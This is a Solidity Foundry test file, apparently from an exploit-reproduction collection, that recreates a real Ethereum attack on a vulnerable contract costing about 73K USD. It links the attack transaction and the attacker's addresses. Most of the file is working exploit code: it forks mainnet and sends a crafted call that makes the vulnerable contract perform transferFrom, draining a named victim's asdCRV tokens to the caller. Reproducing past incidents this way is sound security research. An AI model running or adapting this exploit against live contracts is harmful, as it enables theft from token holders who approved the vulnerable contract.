// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo -- Total Lost : ~73K USD
// TX : https://app.blocksec.com/explorer/tx/eth/0x491cf8b2a5753fdbf3096b42e0a16bc109b957dc112d6537b1ed306e483d0744
// Attacker : https://etherscan.io/address/0x53635bf7b92b9512f6de0eb7450b26d5d1ad9a4c
// Attack Contract : https://etherscan.io/address/0xba8ce86147ded54c0879c9a954f9754a472704aa
// GUY : https://x.com/shoucccc/status/1815981585637990899


contract ContractTest is Test {
    address public VulnContract=0x3d20601ac0Ba9CAE4564dDf7870825c505B69F1a;
    address victim=0x279a7DBFaE376427FFac52fcb0883147D42165FF;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    IERC20 asdCRV = IERC20(0x43E54C2E7b3e294De3A155785F52AB49d87B9922);
    function setUp() public {
        vm.createSelectFork("mainnet", 20369956);
    }

    function testExploit() external {
        emit log_named_decimal_uint("[Begin] Attacker asdCRV balance before exploit", asdCRV.balanceOf(address(this)), asdCRV.decimals());
        attack();
        emit log_named_decimal_uint("[End] Attacker asdCRV balance after exploit", asdCRV.balanceOf(address(this)), asdCRV.decimals());
    }

    function attack() public {
        bytes memory datas=abi.encode(address(asdCRV),address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE),0,address(this),1,abi.encodeWithSelector(bytes4(0x23b872dd),address(victim),address(this),asdCRV.balanceOf(address(victim))));
        bytes memory command=hex"12";
        bytes[] memory data=new bytes[](1);
        data[0]=datas;
        address(VulnContract).call(abi.encodeWithSelector(bytes4(0x3593564c), command,data,block.timestamp+20));
    }
    fallback() external payable{}
}

